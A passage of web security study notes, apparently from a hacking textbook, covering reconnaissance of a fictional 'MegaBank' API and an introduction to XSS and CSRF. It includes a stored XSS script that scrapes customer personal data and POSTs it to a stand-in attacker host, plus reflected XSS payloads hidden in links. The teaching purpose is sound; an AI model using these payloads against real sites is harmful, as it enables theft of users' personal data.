Several applications can automate this process. **Wappalyzer** (`https://www.wappalyzer.com/`) is a browser extension that identifies content management systems, frameworks, and programming languages used on a site. **BuiltWith** (`https://builtwith.com/`) is a website that shows you which web technologies a site is built with. **StackShare** (`https://stackshare.io/`) is an online platform that allows developers to share the tech they use. You can use it to find out if the organization’s developers have posted their tech stack. Finally, `Retire.js` is a tool that detects outdated JavaScript libraries and Node.js packages. You can use it to check for outdated technologies on a site.

## API analysis

### Endpoing discovery

The HTTP specification defines a special method that only exists to give information about a particular API's verbs. This method is called OPTIONS, and should be our first go-to when performing recon against an API. We can easily make a request in curl from the terminal:

```
curl -i -X OPTIONS https://api.mega-bank.com/users/1234
```

If the OPTIONS request was successful, we should see the following response:

```
200 OK
Allow: HEAD, GET, PUT, DELETE, OPTIONS
```

Generally speaking, `OPTIONS` will only be available on APIs specifically designated for public use. So while it's an easy first attempt, we will need a more robust discovery solution for most apps we attempt to test. Very few enterprise applications expose `OPTIONS`.

Let's move on to a more likely method of determining accepted HTTP verbs. The first API call we saw in our browser was the following:

```
GET api.mega-bank.com/users/1234
```

We can now expand this to:

```
GET api.mega-bank.com/users/1234
POST api.mega-bank.com/users/1234
PUT api.mega-bank.com/users/1234
PATCH api.mega-bank.com/users/1234
DELETE api.mega-bank.com/users/1234
```

With the above list of HTTP verbs in mind, we can generate a script to test the legitimacy of our theory.

```js
/*
 * Given a URL (cooresponding to an API endpoint),
 * attempt requests with various HTTP verbs to determine
 * which HTTP verbs map to the given endpoint.
 */
const discoverHTTPVerbs = function (url) {
  const verbs = ["POST", "GET", "PUT", "PATCH", "DELETE"];
  const promises = [];
  verbs.forEach((verb) => {
    const promise = new Promise((resolve, reject) => {
      const http = new XMLHttpRequest();
      http.open(verb, url, true);
      http.setRequestHeader(
        "Content-type",
        "application/x-www-form-urlencoded",
      );
      /*
       * If the request is successful, resolve the promise and
       * include the status code in the result.
       */
      http.onreadystatechange = function () {
        if (http.readyState === 4) {
          return resolve({ verb: verb, status: http.status });
        }
      };
      /*
       * If the request is not successful, or does not complete in time, mark
       * the request as unsuccessful. The timeout should be tweaked based on
       * average response time.
       */
      setTimeout(() => {
        return resolve({ verb: verb, status: -1 });
      }, 1000);
      // initiate the HTTP request
      http.send({});
    });
    // add the promise object to the promises array
    promises.push(promise);
  });
  /*
   * When all verbs have been attempted, log the results of their
   * respective promises to the console.
   */
  Promise.all(promises).then(function (values) {
    console.log(values);
  });
};
```

The way this script functions on a technical level is just as simple. HTTP endpoints return a status code alongside any message they send back to the browser. We don't actually care what this status code is. We just want to see a status code.

### Authentication mechanisms

Guessing the payload shape required for an API endpoint is much more difficult than just asserting that an API endpoint exists.

It's usually best to start with common endpoints that can be found on nearly every application: sign in, sign up, password reset, etc. These often take a similarly shaped payload to that of other apps, since authentication is usually designed based on a standardized scheme.

if we can reverse engineer the type of authentication used and understand how the token is being attached to requests, it will be easier to analyze other API endpoints that rely on an authenticated user token. Here is a table of major authentication schemes:

| Authentication scheme      | Implementation details                                                                 | Strengths                                                                    | Weaknesses                                                                      |
| -------------------------- | -------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| HTTP Basic auth            | Username and password sent on each request                                             | All major browsers support this natively                                     | Session does not expire; easy to intercept                                      |
| HTTP Digest authentication | Hashed `username:realm:password` sent on each request                                  | More difficult to intercept; server can reject expired tokens                | Encryption strength dependent on hashing algorithm used                         |
| OAuth                      | "Bearer" token-based auth; allows sign in with other websites such as Amazon -> Twitch | Tokenized permissions can be shared from one app to another for integrations | Phishing rist; central site can be compromised, compromising all connected apps |

If we log in to `https://www.mega-bank.com` and analyze the network response, we might see something like this after the login succeeds:

```
GET /homepage
HOST mega-bank.com
Authorization: Basic am9lOjEyMzQ=
Content Type: application/json
```

We can tell at first glance that this is HTTP basic authentication because of the Basic authorization header being sent. Furthermore, the string `am9lOjEyMzQ=` is simply a base64-encoded `username:password` string.

In the browser console, we can use the built-in functions btoa(str) and atob(base64) to convert strings to base64 and vice versa. If we run the base64-encoded string through the atob function, we will see the username and password being sent over the network:

```js
/*
 * Decodes a string that was previously encoded with base64.
 * Result = joe:1234
 */
atob("am9lOjEyMzQ=");
```

Because of how insecure this mechanism is, basic authentication is typically only used on web applications that enforce SSL/TLS traffic encryption. This way, credentials cannot be intercepted midair—for example, at a sketchy mall WiFi hotspot.

This means that if we ever run into another endpoint that is not returning anything interesting with an empty payload, the first
thing we should try is attaching an authorization header and seeing if it does anything different when we request as an authenticated user.

### Endpoint shapes

After locating a number of subdomains and the HTTP APIs contained within those subdomains, you should begin determining the HTTP verbs used per resource and adding the results of that investigation to your web application map.

#### Application-specific shapes

Application-specific shapes are much harder to determine than those that are based on public specifications. To determine the shape of a payload expected by an API endpoint, you may need to rely on a number of recon techniques and slowly learn about the endpoint by trial and error.

If you know the name of a variable expected in the payload, but not a value, then you may be able to brute force the request by repeating it with variations until one sticks. Obviously, brute forcing values is slow manually, so you want a script to speed up the process. The more rules you can learn about an expected variable, the better.

## Identifying thrid-party dependencies

During reconnaissance you will likely encounter many third-party integrations, and you will want to pay a lot of attention to both the dependency and the method of integration. Often these dependencies can turn into attack vectors; sometimes vulnerabilities in such dependencies are well known and you may not even have to prepare an attack yourself but will instead be able to copy an attack from a Common Vulnerabilities and Exposures (CVE) database.

### Detecting client-side frameworks

Usually all three of these are easy to detect, and if you can pin down the version number, you can often find a combination of applicable ReDoS, Prototype Pollution, and XSS vulnerabilities on the web (in particular with older versions that have not been updated).

#### Detecting SPA frameworks

The largest SPA frameworks on the web as of 2019 are (in no particular order):

• EmberJS (LinkedIn, Netflix)
• AngularJS (Google)
• React (Facebook)
• VueJS (Adobe, GitLab)

##### EmberJS

EmberJS is quite easy to detect because when EmberJS bootstraps, it sets up a global variable `Ember` that can easily be found in the browser console:

```js
Ember.VERSION;
```

##### AngularJS

Older versions of Angular provide a global object similar to EmberJS. The global object is named `angular`, and the version can be derived from its property `angular.version`. AngularJS 4.0+ got rid of this global object, which makes it a bit harder to determine the version of an AngularJS app. You can detect if an application is running AngularJS 4.0+ by checking to see if the `ng` global exists in the console.

```js
// returns array of root elements
const elements = getAllAngularRootElements();
const version = elements[0].attributes["ng-version"];
// ng-version="6.1.2"
console.log(version);
```

##### React

React can be identified by the global object React, and like EmberJS, can have its version detected easily via a constant:

```js
const version = React.version;
// 0.13.3
console.log(version);
```

You may also notice script tags with the type `text/jsx` referencing React's special file format that contains JavaScript, CSS, and HTML all in the same file.

##### VueJS

Similarly to React and EmberJS, VueJS exposes a global object Vue with a version constant:

```js
const version = Vue.version;
// 2.6.10
console.log(version);
```

If you cannot inspect elements on a VueJS app, it is likely because the app was configured to ignore developer tools.

You can flip this property to true in order to begin inspecting VueJS components in the browser console again:

```js
// Vue components can now be inspected
Vue.config.devtools = true;
```

### Detecting JavaScript Libraries

Beyond the major libraries you are better off running a query to see all of the external scripts loaded into the page.

We can make use of the DOM's querySelectorAll function to rapidly find a list of all third-party scripts imported into the page:

```js
/*
 * Makes use of built-in DOM traversal function
 * to quickly generate a list of each <script>
 * tag imported into the current page.
 */
const getScripts = function () {
  /*
   * A query selector can either start with a "."
   * if referencing a CSS class, a "#" if referencing
   * an `id` attribute, or with no prefix if referencing an HTML element.
   *
   * In this case, 'script' will find all instances of <script>.
   */
  const scripts = document.querySelectorAll("script");
  /*
   * Iterate through each `<script>` element, and check if the element
   * contains a source (src) attribute that is not empty.
   */
  scripts.forEach((script) => {
    if (script.src) {
      console.log(`i: ${script.src}`);
    }
  });
};
```

### Detecting CSS libraries

With minor modifications to the algorithm to detect scripts, we can also detect CSS:

```js
/*
 * Makes use of DOM traversal built into the browser to
 * quickly aggregate every `<link>` element that includes
 * a `rel` attribute with the value `stylesheet`.
 */
const getStyles = function () {
  const scripts = document.querySelectorAll("link");
  /*
   * Iterate through each script, and confirm that the `link`
   * element contains a `rel` attribute with the value `stylesheet`.
   *
   * Link is a multipurpose element most commonly used for loading CSS
   * stylesheets, but also used for preloading, icons, or search.
   */
  scripts.forEach((link) => {
    if (link.rel === "stylesheet") {
      console.log(`i: ${link.getAttribute("href")}`);
    }
  });
};
```

### Detecting server-side frameworks

Detecting what dependencies a server has is much harder, but often not impossible. Sometimes server-side dependencies leave a distinct mark on HTTP traffic (headers, optional fields) or expose their own endpoints. Detecting server-side frameworks requires more knowledge about the individual frameworks being used, but fortunately, just like on the client, there are a few packages that are very widely used. If you can memorize ways to detect the top packages, you will be able to recognize them on many web applications that you investigate.

#### Header detection

Some insecurely configured web server packages expose too much data in their default headers. A prime example of this is the X-Powered-By header, which will literally give away the name and version of a web server

Make any call to one of those vulnerable web servers and you should see a return value like this in the response:

```
X-Powered-By: ASP.NET
```

If you are very lucky, the web server might even provide additional information:

```
Server: Microsoft-IIS/4.5
X-AspNet-Version: 4.0.25
```

#### Default Error Messages and 404 Pages

Some popular frameworks don't provide very easy methods of determining the version number used. If these frameworks are open source, like Ruby on Rails, then you may be able to determine the version used via fingerprinting. Specific changes from commit to commit on GitHub can be used to fingerprint the version of the framwork that is being used on the server.

Most web servers provide their own default error messages and 404 pages, which continue to be presented to users until they are replaced with a custom alternative by the owner of the web application.

These 404 pages and error messages can expose quite a bit of intelligence regarding your server setup. Not only can these expose your server software, but they can often expose the version or range of versions as well.

### Database detection

If database error messages are sent to the client directly, a similar technique to the one for detecting server packages can be used to determine the database. Often this is not the case, so you must find an alternative discovery route.

One technique that can be used is primary key scanning. Most databases support the notion of a “primary key,” which refers to a key in a table (SQL) or document (NoSQL) that is generated automatically upon object creation and used for rapidly performing lookups in the database.

# Offense

Here we will learn about attacks that stem from insecure API endpoints, insecure web forms in the UI, poorly designed browser standards, improperly configured server-side parsers, and more.

## The hacker's mindset

Becoming a successful hacker takes more than a set of objectively measurable skills and knowledge—it also takes a very particular mindset.

Hackers measure productivity in ways that are much more difficult to discern and measure. This is because the majority of hacking is actually data gathering and analysis. Often this process is riddled with false positives and might look like time wasted to an uneducated onlooker.

Most hackers don't deconstruct or modify software but instead analyze software in order to work with the existing codebase — seeking entrypoints rather than making them.

Any given codebase is full of bugs that could potentially be exploitable. A good hacker is constantly on the lookout for clues that could lead to the discovery of a vulnerability.

Unfortunately, the nature of this work means that even a good hacker can go a significant amount of time without a big success. It's entirely possible to spend weeks, if not months, analyzing a web application before a suitable entrypoint can be found and an exploit can be designed and delivered.

As a hacker you need to constantly reinforce the importance of finding and delivering a payload. Beyond that, you must also carefully keep a record of your prior attempts, and the lessons learned from them. Attention to detail when logging prior work will be crucial as you move from exploring small applications and begin hacking larger applications, in particular with key functionality or data as the target.

A hacker is first and foremost a detective. A good hacker is a detective who is properly organized, and a great hacker is a good hacker who happens to also have excellent technical knowledge and skills. A master hacker has all of the above, and is constantly learning and adapting their skill set as those who try to ward them off improve upon their own skills.

## Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) vulnerabilities are some of the most common vulnerabilities throughout the internet, and have appeared as a direct response to the increasing amount of user interaction in today's web applications.

At its core, an XSS attack functions by taking advantage of the fact that web applications execute scripts on users' browsers.

XXS attacks are categorized a number of ways, with the big three being:

• Stored (the code is stored on a database prior to execution)
• Reflected (the code is not stored in a database, but reflected by a server)
• DOM-based (code is both stored and executed in the browser)

### XSS discovery and exploitation

Generally, this is what happens in a typical web application:

```
user submits comment via web form ->
user comment is stored in database ->
comment is requested via HTTP request by one or more users ->
comment is injected into the page ->
injected comment is interpreted as DOM rather than text
```

We could have caused a lot of havoc using the same vulnerability. Script tags are the most popular way to take advantage of XSS vulnerabilities,
but there are many ways to take advantage of such a bug.

Consider if the support comment had the following instead of just a tag to bold the text:

```html
<!-- I am not happy with the service provided by your bank. -->
<!-- I have waited 12 hours for my deposit to show up in the web application. Please improve your web application. -->
<!-- Other banks will show deposits instantly. -->

<script>
  /*
   * Get a list of all customers from the page.
   */
  const customers = document.querySelectorAll(".openCases");
  /*
   * Iterate through each DOM element containing the openCases class,
   * collecting privileged personal identifier information (PII)
   * and store that data in the customerData array.
   */
  const customerData = [];

  customers.forEach((customer) => {
    customerData.push({
      firstName: customer.querySelector(".firstName").innerText,
      lastName: customer.querySelector(".lastName").innerText,
      email: customer.querySelector(".email").innerText,
      phone: customer.querySelector(".phone").innerText,
    });
  });
  /*
   * Build a new HTTP request, and exfiltrate the previously collected
   * data to the hacker's own servers.
   */
  const http = new XMLHttpRequest();
  http.open("POST", "https://steal-your-data.com/data", true);
  http.setRequestHeader("Content-type", "application/json");
  http.send(JSON.stringify(customerData));
</script>
```

This is a much more malicious use case. And it's extremely dangerous for a number of reasons. The preceding code is what is known as a stored XSS attack—a variation of XSS that relies on the actual attack code being stored in the application owner's databases. In our case, the comment we sent to support is being stored on MegaBank's servers.

The scariest thing about this is that because this code is inside of a script tag, it would not appear to the customer support rep. The customer support rep would see the literal request text, but the `<script></script>` tags and everything in between would not be visible to the rep, although it would be executing in the background.

To summarize, XSS attacks:
• Run a script in the browser that was not written by the web application owner
• Can run behind the scenes, without any visibility or required user input to start
execution
• Can obtain any type of data present in the current web application
• Can freely send and receive data from a malicious web server
• Occur as a result of improperly sanitized user input being embedded in the UI
• Can be used to steal session tokens, leading to account takeover
• Can be used to draw DOM objects over the current UI, leading to perfect phishing attacks that cannot be identified by a nontechnical user

### Stored XSS

Stored XSS attacks are probably the most common type of XSS attack. Stored XSS attacks are interesting because they are the easiest type of XSS to detect, but often one of the most dangerous because many times they can affect the most users.

On the other hand, the permanent nature of a stored XSS makes detection quite easy. Although the script itself executes on the client (browser), the script is stored in a database, aka server side. The scripts are stored as text server side, and are not evalutated (except perhaps in advanced cases involving Node.js servers, in which case they become classified as remote code execution [RCE], which we will cover later).

Because the scripts are stored server side, regularly scanning database entries for signs of stored script could be a cheap and efficient mitigation plan for a site that stores many types of data provided by an end user. This is, in fact, one of many techniques that the most security-oriented software companies today use to mitigate the risk of XSS. We will soon discover that it cannot be a final solution, however, as advanced XSS payloads may not even be written in plain text (e.g., base64, binary, etc.). They also could potentially be stored in multiple places and only be dangerous when concatenated by a specific service for use in the client. These are some tricks that experienced hackers use to bypass defense mechanisms implemented by developers.

A simple regex to ban script tags or a CSP rule to prevent inline script execution would have halted this attack in its tracks.

The only requirement for an XSS attack to be categorized as “stored” is that the payload must be stored in the application's database. There is no requirement for this payload to be valid JavaScript, nor is there a requirement for the client to be a web browser.

### Reflected XSS

Reflected XSS Operate identically to stored XSS attacks but are not stored in a database, nor should they regularly hit a server. A reflected XSS affects the code of the client in the browser directly without relying on a server to relay a message to be rendered with a script to be executed.

This is the regular workflow in such an attack:

1. User#1 creates a malicious link that includes script in the URL.
2. User#1 shares the malicious link on the web, waiting for User#2 to click it.
3. User#2 clicks the link, opening the web page.
4. The URL is reflected into the browser DOM, resulting in script execution.

As a result of not being stored on the server, reflected XSS can be a bit hard to understand compared to stored XSS. Let's start out with an example.

Let's go over an example to make this clear. Imagine in a website, there is a searchbar and whatever you type in this searchbar would appear as a heading in the results page. If you put this in the searchbar:

```
open+<script>alert(test);</script>checking+account
```

And then you see an alert popup in the results page, you have found that there is an XSS vulnerability - only this time it will not be stored
in the server. Instead, the server will read it and send it back to the client. These types of vulnerabilities are called "reflected XSS."

Reflected XSS is much more difficult to detect since these attacks often target a user directly and are never stored in a database. In our example, we could craft a malicious link payload and send it to the user we wish to attack directly. This could be done via email, web-based advertisements, or many other ways.

Furthermore, the reflected XSS we discussed previously could easily be disguised as a valid link. Let's take this HTML snippet as an example:

```html
Welcome to MegaBank Fans! Your #1 source for legit MegaBank support info and
links.
<a href="https://mega-bank.com/signup">Become a New Customer</a>
<a href="https://mega-bank.com/promos">See Promotional Offers</a>
<a
  href="https://support.mega-bank.com/search?query=open+<script>alert('test');</script>checking+account"
  >Create a New Checking Account</a
>
```

It's safe to say that as a general rule, reflected XSS is much better at avoiding detection, but generally harder to distribute to a wide number of users.

### DOM-Based XSS

DOM XSS can be either reflected or stored, but makes use of browser DOM sinks and sources for execution. Due to differences in browser DOM implementation, some browsers might be vulnerable while others are not. These XSS attacks are much more difficult to find and take advantage of than traditional reflected or stored XSS, as they require deep knowledge of the browser DOM and JavaScript.

This is generally what happens in these attacks:

1. A web page allows User#1 to switch between filters which are stored on `window.location.hash`
2. The DOM is rebuilt using `DomParser.parseFromString()` and the result is formatted and appended to `<body>` with a title reflecting the chosen filter.
3. User#1 manually changes the hash to include script.
4. A new DOM script node is created, and appended along with the new DOM body of the page.
5. The script node executes as it loads in to the page.

The major difference between for DOM XSS and other forms of XSS is that DOM-based XSS attacks never require any interaction with a server.

Because DOM XSS doesn't require a server to function, both a "source”" and a "sink" must be present in the browser DOM. Generally, the source is a DOM object capable of storing text, and the sink is a DOM API capable of executing a script stored as text.

DOM XSS is also difficult to deal with because of the number of different browsers there are in use today. It is very possible that a bug in a DOM implementation shipped by one browser would not be present in the DOM implementation shipped by another browser.

Now it's important to note that just because the URL changes, that does not always mean requests against the server are being made. This is more often the case in modern web applications that make use of their own JavaScript-based routers, as this can result in a better user experience.

it's important to note that query params like search can be a source for DOM XSS, and they can be found in all major browsers via `window.location.search`.

Likewise, the hash can also be found in the DOM via window.location.hash. This means that a payload could be injected into the search query param or the hash. A dangerous payload in many of these sources will not cause any trouble, unless another body of code actually makes use of it in a way that could cause script execution to occur—hence the need for both a "source" and a "sink". So the source would be the `window.location.hash` or `window.location.search` and the sink would be a code like `document.write(document.location.hash)` that puts the exact hash from the source.

## Cross-Site Request Forgery (CSRF)

Sometimes we already know an API endpoint exists that would allow us to perform an operation we wish to perform, but we do not have access to that endpoint because it requires privileged access (e.g., an admin account).

CSRF attacks take advantage of the way browsers operate and the trust relationship between a website and the browser. By finding API calls that rely on this relationship to ensure security—but yield too much trust to the browser—we can craft links and forms that with a little bit of effort can cause a user to make requests on his or her own behalf—unknown to the user generating the request.
